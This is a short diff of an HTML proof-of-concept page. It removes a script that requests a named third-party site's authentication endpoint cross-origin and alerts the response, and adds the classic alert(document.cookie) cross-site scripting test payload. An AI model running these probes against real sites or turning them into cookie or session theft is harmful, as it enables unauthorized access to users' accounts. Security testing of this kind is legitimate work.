@@ -1,21 +1,6 @@
 <!DOCTYPE>
 <html>
 <script type="text/javascript">
-function loadXMLDoc()
-{
-    var xhr = new XMLHttpRequest();
-
-    xhr.onreadystatechange=function()
-    {
-        if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response
-        {
-            var datas=xhr.responseText;
-            alert(datas);
-        }
-    }
-    xhr.open("GET","https://e.didachuxing.com/app/phoenix/didaweb_auth.php?didaweburl=/firm/firmInfo","true") 
-    xhr.send();
-}
-loadXMLDoc();
+alert(document.cookie)
 </script>
 </html>
